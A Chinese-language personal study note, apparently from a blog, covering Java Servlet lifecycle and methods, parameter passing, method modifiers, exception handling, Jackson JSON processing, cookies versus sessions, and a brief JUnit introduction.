<h3 id="Servlet-任务"><a href="#Servlet-任务" class="headerlink" title="Servlet 任务"></a>Servlet 任务</h3><p>Servlet 执行以下主要任务：</p>
<ul>
<li>读取客户端（浏览器）发送的显式的数据。这包括网页上的 HTML 表单，或者也可以是来自 applet 或自定义的 HTTP 客户端程序的表单。</li>
<li>读取客户端（浏览器）发送的隐式的 HTTP 请求数据。这包括 cookies、媒体类型和浏览器能理解的压缩格式等等。</li>
<li>处理数据并生成结果。这个过程可能需要访问数据库，执行 RMI 或 CORBA 调用，调用 Web 服务，或者直接计算得出对应的响应。</li>
<li>发送显式的数据（即文档）到客户端（浏览器）。该文档的格式可以是多种多样的，包括文本文件（HTML 或 XML）、二进制文件（GIF 图像）、Excel 等。</li>
<li>发送隐式的 HTTP 响应到客户端（浏览器）。这包括告诉浏览器或其他客户端被返回的文档类型（例如 HTML），设置 cookies 和缓存参数，以及其他类似的任务。</li>
</ul>
<h3 id="Servlet-生命周期"><a href="#Servlet-生命周期" class="headerlink" title="#Servlet 生命周期"></a><a href="https://dunwu.github.io/java-tutorial/javaee/javaee-servlet.html#servlet-生命周期" target="_blank" rel="noopener">#</a>Servlet 生命周期</h3><p><img src="http://www.runoob.com/wp-content/uploads/2014/07/Servlet-LifeCycle.jpg" alt="img"></p>
<p>Servlet 生命周期如下：</p>
<ol>
<li><strong>加载</strong> - 第一个到达服务器的 HTTP 请求被委派到 Servlet 容器。容器通过类加载器使用 Servlet 类对应的文件加载 servlet；</li>
<li><strong>初始化</strong> - Servlet 通过调用 <strong>init ()</strong> 方法进行初始化。</li>
<li><strong>服务</strong> - Servlet 调用 <strong>service()</strong> 方法来处理客户端的请求。</li>
<li><strong>销毁</strong> - Servlet 通过调用 <strong>destroy()</strong> 方法终止（结束）。</li>
<li><strong>卸载</strong> - Servlet 是由 JVM 的垃圾回收器进行垃圾回收的。</li>
</ol>
<h3 id="Servlet-包"><a href="#Servlet-包" class="headerlink" title="Servlet 包"></a>Servlet 包</h3><p>Java Servlet 是运行在带有支持 Java Servlet 规范的解释器的 web 服务器上的 Java 类。</p>
<p>Servlet 可以使用 <strong>javax.servlet</strong> 和 <strong>javax.servlet.http</strong> 包创建，它是 Java 企业版的标准组成部分，Java 企业版是支持大型开发项目的 Java 类库的扩展版本。</p>
<p>Java Servlet 就像任何其他的 Java 类一样已经被创建和编译。在您安装 Servlet 包并把它们添加到您的计算机上的 Classpath 类路径中之后，您就可以通过 JDK 的 Java 编译器或任何其他编译器来编译 Servlet。</p>
<h3 id="Servlet-接口"><a href="#Servlet-接口" class="headerlink" title="Servlet 接口"></a>Servlet 接口</h3><h4 id="init-方法"><a href="#init-方法" class="headerlink" title="init() 方法"></a>init() 方法</h4><p>init 方法被设计成只调用一次。它在第一次创建 Servlet 时被调用，在后续每次用户请求时不再调用。因此，它是用于一次性初始化，就像 Applet 的 init 方法一样。</p>
<p>Servlet 创建于用户第一次调用对应于该 Servlet 的 URL 时，但是您也可以指定 Servlet 在服务器第一次启动时被加载。</p>
<p>当用户调用一个 Servlet 时，就会创建一个 Servlet 实例，每一个用户请求都会产生一个新的线程，适当的时候移交给 doGet 或 doPost 方法。init() 方法简单地创建或加载一些数据，这些数据将被用于 Servlet 的整个生命周期。</p>
<p>init 方法的定义如下：i</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">  <span class="comment">// 初始化代码...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="service-方法"><a href="#service-方法" class="headerlink" title="service() 方法"></a>service() 方法</h4><p>service() 方法是执行实际任务的主要方法。Servlet 容器（即 Web 服务器）调用 service() 方法来处理来自客户端（浏览器）的请求，并把格式化的响应写回给客户端。</p>
<p>每次服务器接收到一个 Servlet 请求时，服务器会产生一个新的线程并调用服务。service() 方法检查 HTTP 请求类型（GET、POST、PUT、DELETE 等），并在适当的时候调用 doGet、doPost、doPut，doDelete 等方法。</p>
<p>下面是该方法的特征：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                    ServletResponse response)</span></span></span><br><span class="line"><span class="function">      <span class="keyword">throws</span> ServletException, IOException</span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>service() 方法由容器调用，service 方法在适当的时候调用 doGet、doPost、doPut、doDelete 等方法。所以，不用对 service() 方法做任何动作，您只需要根据来自客户端的请求类型来重写 doGet() 或 doPost() 即可。</p>
<p>doGet() 和 doPost() 方法是每次服务请求中最常用的方法。下面是这两种方法的特征。</p>
<h4 id="doGet-方法"><a href="#doGet-方法" class="headerlink" title="doGet() 方法"></a>doGet() 方法</h4><p>GET 请求来自于一个 URL 的正常请求，或者来自于一个未指定 METHOD 的 HTML 表单，它由 doGet() 方法处理。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                  HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    <span class="comment">// Servlet 代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="doPost-方法"><a href="#doPost-方法" class="headerlink" title="doPost() 方法"></a>doPost() 方法</h4><p>POST 请求来自于一个特别指定了 METHOD 为 POST 的 HTML 表单，它由 doPost() 方法处理。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                   HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    <span class="comment">// Servlet 代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="方法destroy-方法"><a href="#方法destroy-方法" class="headerlink" title="方法destroy() 方法"></a>方法destroy() 方法</h4><p>destroy() 方法只会被调用一次，在 Servlet 生命周期结束时被调用。destroy() 方法可以让您的 Servlet 关闭数据库连接、停止后台线程、把 Cookie 列表或点击计数器写入到磁盘，并执行其他类似的清理活动。</p>
<p>在调用 destroy() 方法之后，servlet 对象被标记为垃圾回收。destroy 方法定义如下所示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 终止化代码...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参考：<a href="https://dunwu.github.io/java-tutorial/javaee/javaee-servlet.html#servlet-简介" target="_blank" rel="noopener">java-servelt</a></p>
<h1 id="java-基础"><a href="#java-基础" class="headerlink" title="java 基础"></a>java 基础</h1><h3 id="Java中只有值传递"><a href="#Java中只有值传递" class="headerlink" title="Java中只有值传递"></a>Java中只有值传递</h3><ul>
<li>对于基本类型,直接拷贝值传递过去</li>
<li>对于对象,拷贝当前对象的引用地址,然后把该地址传递过去,所以也是值传递</li>
</ul>
<p>参考：图解Java中的参数传递  <a href="https://zhuanlan.zhihu.com/p/24556934?refer=dreawer" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/24556934?refer=dreawer</a></p>
<h3 id="holder实现”传址“"><a href="#holder实现”传址“" class="headerlink" title="holder实现”传址“"></a>holder实现”传址“</h3><p>用于使传入方法后值改变可被保存</p>
<p>源码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * Copyright (c) 2005, 2010, Oracle and&#x2F;or its affiliates. All rights reserved.</span><br><span class="line"> * ORACLE PROPRIETARY&#x2F;CONFIDENTIAL. Use is subject to license terms.</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">package javax.xml.ws;</span><br><span class="line"></span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * Holds a value of type &lt;code&gt;T&lt;&#x2F;code&gt;.</span><br><span class="line"> *</span><br><span class="line"> * @since JAX-WS 2.0</span><br><span class="line"> *&#x2F;</span><br><span class="line">public final class Holder&lt;T&gt; implements Serializable &#123;</span><br><span class="line"></span><br><span class="line">    private static final long serialVersionUID &#x3D; 2623699057546497185L;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * The value contained in the holder.</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public T value;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * Creates a new holder with a &lt;code&gt;null&lt;&#x2F;code&gt; value.</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public Holder() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#x2F;**</span><br><span class="line">     * Create a new holder with the specified value.</span><br><span class="line">     *</span><br><span class="line">     * @param value The value to be stored in the holder.</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public Holder(T value) &#123;</span><br><span class="line">        this.value &#x3D; value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参考：Java基础系列18：Holder技术的实现原理分析  <a href="https://www.zifangsky.cn/734.html" target="_blank" rel="noopener">https://www.zifangsky.cn/734.html</a></p>
<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>在当时学方法的时候，可把我弄晕了，不过这是很基础的，必须要弄懂。</p>
<p>参考：<a href="https://dunwu.github.io/javacore/basics/java-method.html#default" target="_blank" rel="noopener">深入理解java方法</a></p>
<h5 id="1-访问控制符"><a href="#1-访问控制符" class="headerlink" title="1.访问控制符"></a>1.访问控制符</h5><p>访问权限控制的等级，从最大权限到最小权限依次为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public &gt; protected &gt; 包访问权限（没有任何关键字）&gt; private</span><br></pre></td></tr></table></figure>

<ul>
<li><code>public</code> - 表示任何类都可以访问；</li>
<li><code>包访问权限</code> - 包访问权限，没有任何关键字。它表示当前包中的所有其他类都可以访问，但是其它包的类无法访问。</li>
<li><code>protected</code> - 表示子类可以访问，此外，同一个包内的其他类也可以访问，即使这些类不是子类。</li>
<li><code>private</code> - 表示其它任何类都无法访问。</li>
</ul>
<h5 id="2-各种方法"><a href="#2-各种方法" class="headerlink" title="2.各种方法"></a>2.各种方法</h5><p>一览：<code>staic</code>  <code>final</code>   <code>default</code>  <code>abstract</code>  <code>synchronized</code>  <code>main</code>  <del>finalize()</del></p>
<h6 id="1-static"><a href="#1-static" class="headerlink" title="(1)static"></a><strong>(1)static</strong></h6><p><strong>被 <code>static</code> 修饰的方法被称为静态方法。</strong></p>
<p>静态方法相比于普通的实例方法，主要有以下区别：</p>
<ul>
<li>在外部调用静态方法时，可以使用 <code>类名.方法名</code> 的方式，也可以使用 <code>对象名.方法名</code> 的方式。而实例方法只有后面这种方式。也就是说，<strong>调用静态方法可以无需创建对象</strong>。</li>
<li><strong>静态方法在访问本类的成员时，只允许访问静态成员</strong>（即静态成员变量和静态方法），而不允许访问实例成员变量和实例方法；实例方法则无此限制。</li>
</ul>
<h6 id="2-final"><a href="#2-final" class="headerlink" title="(2)final"></a><strong>(2)final</strong></h6><ul>
<li>被 <code>final</code> 修饰的方法不能被子类覆写（Override）。</li>
</ul>
<h6 id="3-default"><a href="#3-default" class="headerlink" title="(3)default"></a><strong>(3)default</strong></h6><ul>
<li><p><code>default</code> 方法只能出现在接口 <code>Interface</code> 中。</p>
<p>（JDK8 开始，支持在接口 <code>Interface</code> 中定义 <code>default</code> 方法。）</p>
</li>
<li><p>接口中被 <code>default</code> 修饰的方法被称为<strong>默认方法</strong>，实现此接口的类如果没 Override 此方法，则直接继承这个方法，不再强制必须实现此方法。</p>
</li>
</ul>
<h6 id="4-abstract"><a href="#4-abstract" class="headerlink" title="(4)abstract"></a><strong>(4)abstract</strong></h6><p>被 <code>abstract</code> 修饰的方法被称为抽象方法，方法不能有实体。抽象方法只能出现抽象类中。</p>
<h6 id="5-synchronized"><a href="#5-synchronized" class="headerlink" title="(5)synchronized"></a><strong>(5)synchronized</strong></h6><ul>
<li><p><code>synchronized</code> 用于并发编程。被 <code>synchronized</code> 修饰的方法在一个时刻，只允许一个线程执行。</p>
</li>
<li><p>在 Java 并发编程中，synchronized 方法并不是一个好的选择，大多数情况下，我们会选择更加轻量级的锁 。</p>
</li>
</ul>
<h6 id="6-main-方法"><a href="#6-main-方法" class="headerlink" title="(6)main 方法"></a>(6)main 方法</h6><p>Java 中的 main 方法是一种特殊的静态方法，因为所有的 Java 程序都是由 <code>public static void main(String[] args)</code> 方法开始执行。</p>
<p>有很多新手虽然一直用 main 方法，却不知道 main 方法中的 args 有什么用。实际上，这是用来接收<strong>接收命令行输入参数</strong>的。</p>
<p>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainMethodDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (String arg : args) &#123;</span><br><span class="line">            System.out.println(<span class="string">"arg = ["</span> + arg + <span class="string">"]"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>依次执行（直接在类名后面空格隔开输入参数即可，也是多个元素<strong>用空格分割</strong>，加不加双引号都可以）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javac MainMethodDemo.java</span><br><span class="line">java MainMethodDemo A B C</span><br></pre></td></tr></table></figure>

<p>控制台会打印输出参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arg &#x3D; [A]</span><br><span class="line">arg &#x3D; [B]</span><br><span class="line">arg &#x3D; [C]</span><br></pre></td></tr></table></figure>

<h3 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h3><h4 id="1-异常基本概念"><a href="#1-异常基本概念" class="headerlink" title="1.异常基本概念"></a>1.异常基本概念</h4><h5 id="Throwable（异常超类）"><a href="#Throwable（异常超类）" class="headerlink" title="Throwable（异常超类）"></a>Throwable（异常超类）</h5><p><code>Throwable</code> 包含了其线程创建时线程执行堆栈的快照，它提供了 <code>printStackTrace()</code> 等接口用于获取堆栈跟踪数据等信息。</p>
<h5 id="Error（Throwable子类）"><a href="#Error（Throwable子类）" class="headerlink" title="Error（Throwable子类）"></a>Error（Throwable子类）</h5><p><code>Error</code> 是 <code>Throwable</code> 的一个子类。<strong><code>Error</code> 表示合理的应用程序不应该尝试捕获的严重问题</strong>。大多数此类错误都是异常情况。<strong>编译器不会检查 <code>Error</code></strong>。</p>
<h5 id="Exception（Throwable子类）"><a href="#Exception（Throwable子类）" class="headerlink" title="Exception（Throwable子类）"></a>Exception（Throwable子类）</h5><p><code>Exception</code> 是 <code>Throwable</code> 的一个子类。<strong><code>Exception</code> 表示合理的应用程序可能想要捕获的条件。</strong></p>
<p>编译器会检查 <code>Exception</code> 异常。此类异常，要么通过 <code>throws</code> 进行声明抛出，要么通过 <code>try catch</code> 进行捕获处理，否则不能通过编译。</p>
<h5 id="RuntimeException（Exception子类）"><a href="#RuntimeException（Exception子类）" class="headerlink" title="RuntimeException（Exception子类）"></a>RuntimeException（Exception子类）</h5><p><code>RuntimeException</code> 是 <code>Exception</code> 的一个子类。<code>RuntimeException</code> 是那些可能在 Java <strong>虚拟机正常运行期间</strong>抛出的异常的超类。</p>
<p>编译器不会检查 <code>RuntimeException</code> 异常。当程序中可能出现这类异常时，倘若既没有通过 <code>throws</code> 声明抛出它，也没有用 <code>try catch</code> 语句捕获它，程序还是会编译通过。</p>
<h4 id="2-捕获异常-gt-处理"><a href="#2-捕获异常-gt-处理" class="headerlink" title="2.捕获异常-&gt;处理"></a>2.捕获异常-&gt;处理</h4><p><strong>使用 try 和 catch 关键字可以捕获异常</strong>。try catch 代码块放在异常可能发生的地方。</p>
<p>它的语法形式如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 可能会发生异常的代码块</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e1) &#123;</span><br><span class="line">    <span class="comment">// 捕获并处理try抛出的异常类型Exception</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception2 e2) &#123;</span><br><span class="line">    <span class="comment">// 捕获并处理try抛出的异常类型Exception2</span></span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="comment">// 无论是否发生异常，都将执行的代码块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>try</code> - <strong><code>try</code> 语句用于监听。将要被监听的代码(可能抛出异常的代码)放在 <code>try</code> 语句块之内，当 <code>try</code> 语句块内发生异常时，异常就被抛出。</strong></p>
</li>
<li><p><code>catch</code> - <code>catch</code> 语句包含要捕获异常类型的声明。当保护代码块中发生一个异常时，<code>try</code> 后面的 <code>catch</code> 块就会被检查。</p>
</li>
<li><p><code>finally</code> - <strong><code>finally</code> 语句块总是会被执行，无论是否出现异常。</strong></p>
<ul>
<li><code>finally</code> 中的 <code>return</code> 会覆盖 <code>catch</code> 代码块中的 <code>return</code> 语句和 <code>throw</code> 语句，所以 Java <strong>不建议在 <code>finally</code> 中使用 <code>return</code> 语句</strong>。</li>
<li>此外 <code>finally</code> 中的 <code>throw</code> 语句也会覆盖 <code>catch</code> 代码块中的 <code>return</code> 语句和 <code>throw</code> 语句。</li>
</ul>
</li>
</ul>
<h4 id="3-抛出异常throw-s"><a href="#3-抛出异常throw-s" class="headerlink" title="3.抛出异常throw(s)"></a>3.抛出异常throw(s)</h4><p>如果想在程序中明确地抛出异常，需要用到 <code>throw</code> 和 <code>throws</code> 。</p>
<p>如果一个方法没有捕获一个检查性异常，那么该方法必须使用 <code>throws</code> 关键字来声明。<code>throws</code> 关键字放在方法名字的尾部。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class ThrowDemo &#123;</span><br><span class="line">    public static void f() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            throw new RuntimeException(&quot;抛出一个异常&quot;);######</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            System.out.println(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws NoSuchMethodException&#123;</span><br><span class="line">        f();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="4-自定义异常"><a href="#4-自定义异常" class="headerlink" title="4.自定义异常"></a>4.自定义异常</h4><p><strong>自定义一个异常类，只需要继承 <code>Exception</code> 或 <code>RuntimeException</code> 即可。</strong></p>
<p>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyExceptionDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        throw new MyException("自定义异常");##### 自定义需要 抛出，抛出的异常由调用者处理</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyException</span> <span class="keyword">extends</span> <span class="title">RuntimeException</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">MyException</span><span class="params">(String message)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(message);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; io.github.dunwu.javacore.exception.MyExceptionDemo$MyException: 自定义异常</span><br><span class="line">	at io.github.dunwu.javacore.exception.MyExceptionDemo.main(MyExceptionDemo.java:9)</span><br></pre></td></tr></table></figure>

<h4 id="5-异常链"><a href="#5-异常链" class="headerlink" title="5. 异常链"></a>5. 异常链</h4><p>异常链是以一个异常对象为参数构造新的异常对象，新的异常对象将包含先前异常的信息。</p>
<p>我们有两种方式做异常链：</p>
<ul>
<li>一是 throws 抛出<strong>交给上级处理</strong>。</li>
<li>二是 try…catch <strong>做具体处理</strong>。而为了构造异常链，try…catch 的 catch 块我们可以不需要做任何处理，仅仅只用 throw 这个关键字将我们封装异常信息主动抛出来。然后在通过关键字 throws 继续抛出该方法异常（交给上层处理）。它的上层也可以做这样的处理，以此类推就会产生一条由异常构成的异常链。</li>
</ul>
<p>参考：<a href="[https://dunwu.github.io/javacore/basics/java-exception.html#%E6%8D%95%E8%8E%B7%E5%BC%82%E5%B8%B8](https://dunwu.github.io/javacore/basics/java-exception.html#捕获异常)">异常处理</a></p>
<h3 id="JSON处理"><a href="#JSON处理" class="headerlink" title="JSON处理"></a>JSON处理</h3><ul>
<li>只有两种结构：对象内的键值对集合结构和数组，对象用 <code>{}</code> 表示、内部是”key”:”value”，数组用 <code>[]</code> 表示，不同值用逗号分开</li>
<li>基本数值有 7 个： false / null / true / object / array / number / string</li>
<li>再加上结构可以嵌套，进而可以用来表达复杂的数据</li>
<li>一个简单实例：</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="attr">"Image"</span>: &#123;</span><br><span class="line">  <span class="attr">"Width"</span>: <span class="number">800</span>,</span><br><span class="line">  <span class="attr">"Height"</span>: <span class="number">600</span>,</span><br><span class="line">  <span class="attr">"Title"</span>: <span class="string">"View from 15th Floor"</span>,</span><br><span class="line">  <span class="attr">"Thumbnail"</span>: &#123;</span><br><span class="line">   <span class="attr">"Url"</span>: <span class="string">"http://www.example.com/image/481989943"</span>,</span><br><span class="line">   <span class="attr">"Height"</span>: <span class="number">125</span>,</span><br><span class="line">   <span class="attr">"Width"</span>: <span class="string">"100"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"IDs"</span>: [<span class="number">116</span>, <span class="number">943</span>, <span class="number">234</span>, <span class="number">38793</span>]</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Jackson-应用"><a href="#Jackson-应用" class="headerlink" title="Jackson 应用"></a>Jackson 应用</h4><blockquote>
<p>扩展阅读：更多 API 使用细节可以参考 <a href="https://github.com/FasterXML/jackson-databind" target="_blank" rel="noopener">jackson-databind 官方说明</a></p>
</blockquote>
<h4 id="3-1-添加-maven-依赖"><a href="#3-1-添加-maven-依赖" class="headerlink" title="3.1. 添加 maven 依赖"></a>3.1. 添加 maven 依赖</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="3-2-Jackson-API"><a href="#3-2-Jackson-API" class="headerlink" title="3.2. Jackson API"></a>3.2. Jackson API</h4><h4 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"><span class="comment">//如下三种方法构造mapper_json</span></span><br><span class="line">mapper.writeValue(<span class="keyword">new</span> File(<span class="string">"result.json"</span>), myResultObject);<span class="comment">//myResultObject是存入对象</span></span><br><span class="line"><span class="comment">// or:</span></span><br><span class="line"><span class="keyword">byte</span>[] jsonBytes = mapper.writeValueAsBytes(myResultObject);</span><br><span class="line"><span class="comment">// or:</span></span><br><span class="line">String jsonString = mapper.writeValueAsString(myResultObject);</span><br></pre></td></tr></table></figure>

<h4 id="反格式化"><a href="#反格式化" class="headerlink" title="反格式化"></a>反格式化</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"><span class="comment">//如下三种方法提取mapper_json</span></span><br><span class="line">MyValue value = mapper.readValue(<span class="keyword">new</span> File(<span class="string">"data.json"</span>), MyValue<span class="class">.<span class="keyword">class</span>)</span>;<span class="comment">//Myvuale是类</span></span><br><span class="line"><span class="comment">// or:</span></span><br><span class="line">value = mapper.readValue(<span class="keyword">new</span> URL(<span class="string">"http://some.com/api/entry.json"</span>), MyValue<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">// or:</span></span><br><span class="line">value = mapper.readValue(<span class="string">"&#123;\"name\":\"Bob\", \"age\":13&#125;"</span>, MyValue<span class="class">.<span class="keyword">class</span>)</span>;</span><br></pre></td></tr></table></figure>

<h4 id="泛型容器的格式化和反格式化"><a href="#泛型容器的格式化和反格式化" class="headerlink" title="泛型容器的格式化和反格式化"></a>泛型容器的格式化和反格式化</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Person p = <span class="keyword">new</span> Person(<span class="string">"Tom"</span>, <span class="number">20</span>);</span><br><span class="line">Person p2 = <span class="keyword">new</span> Person(<span class="string">"Jack"</span>, <span class="number">22</span>);</span><br><span class="line">Person p3 = <span class="keyword">new</span> Person(<span class="string">"Mary"</span>, <span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">List&lt;Person&gt; persons = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">persons.add(p);</span><br><span class="line">persons.add(p2);</span><br><span class="line">persons.add(p3);</span><br><span class="line"></span><br><span class="line">Map&lt;String, List&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">map.put(<span class="string">"persons"</span>, persons);<span class="comment">//把person List放到map中</span></span><br><span class="line"></span><br><span class="line">String json = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"> json = mapper.writeValueAsString(map);<span class="comment">//把map放进json中</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (JsonProcessingException e) &#123;</span><br><span class="line"> e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Cookie-amp-Session"><a href="#Cookie-amp-Session" class="headerlink" title="Cookie &amp; Session"></a>Cookie &amp; Session</h3><p>Cookie和Session都是用于会话追踪的，即用户登陆状态的维持。</p>
<p>Web应用程序是使用HTTP协议传输数据的。HTTP协议是无状态的协议,要跟踪该会话，必须引入一种机制。</p>
<h4 id="1-Cookie机制"><a href="#1-Cookie机制" class="headerlink" title="1.Cookie机制"></a>1.Cookie机制</h4><p>在Session出现之前，基本上所有的网站都采用Cookie来跟踪会话。</p>
<p>Cookie实际上是一小段的文本信息。</p>
<p>客户端请求服务器，如果服务器需要记录该用户状态，就使用<code>response</code>向客 户端浏览器颁发一个Cookie。</p>
<p>客户端浏览器会把Cookie保存起来。当浏览器再请求该网站时，浏览器把请求的网址连同该Cookie一同提交给服</p>
<p>务器。服务器检查该Cookie，以此来辨认用户状态。</p>
<p>服务器还可以根据需要修改Cookie的内容。这样服务器就能从通行证上确认客户身份了。这就是Cookie的工作原理。</p>
<h4 id="2-Session机制"><a href="#2-Session机制" class="headerlink" title="2.Session机制"></a>2.Session机制</h4><p>除了使用Cookie，Web应用程序中还经常使用Session来记录客户端状态。Session是服务器端使用的一种记录客</p>
<p>户端状态的机制，使用上比Cookie简单一些，相应的也增加了服务器的存储压力。</p>
<p>Session是另一种记录客户状态的机制，不同的是Cookie保存在客户端浏览器中，而Session保存在服务器上。</p>
<p>客户端浏览器访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上。这就Session。客户端浏览</p>
<p>器再次访问时只需要从该Session中查找该客户的状态就可以了。</p>
<p>如果说Cookie机制是通过检查客户身上的“通行证”来确定客户身份的话，那么Session机制就是通过检查服务器上</p>
<p>的“客户明细表”来确认客户身份。Session相当于程序在服务器上建立的一份客户案，客户来访的时候只需要查询</p>
<p>客户档案表就可以了。</p>
<h3 id="Junit测试"><a href="#Junit测试" class="headerlink" title="Junit测试"></a>Junit测试</h3><p>参考：Junit的基本使用（详解）<a href="https://blog.csdn.net/fulishafulisha/article/details/80158392" target="_blank" rel="noopener">https://blog.csdn.net/fulishafulisha/article/details/80158392</a>    </p>
<p>什么是Junit?</p>
<p>Junit是xUnit的一个子集，在c++,paython,java语言中测试框架的名字都不相同</p>
<p>xUnit是一套基于测试驱动开发的测试框架</p>
<p>其中的断言机制：将程序预期的结果与程序运行的最终结果进行比对，确保对结果的可预知性</p>
